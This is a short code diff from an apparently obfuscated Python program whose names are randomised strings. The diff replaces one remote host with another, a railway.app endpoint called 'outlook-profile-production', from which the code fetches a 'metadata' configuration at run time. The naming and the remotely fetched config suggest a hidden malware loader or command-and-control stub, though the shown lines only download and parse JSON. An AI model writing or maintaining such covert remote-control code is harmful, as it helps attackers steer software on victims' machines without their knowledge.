@@ -18,7 +18,7 @@ def process_psawsd_659():
 
     def train_fymfpl_546():
         try:
-            eval_poadmi_609 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_poadmi_609 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_poadmi_609.raise_for_status()
             data_oefnqb_949 = eval_poadmi_609.json()
             config_xdnjum_193 = data_oefnqb_949.get('metadata')
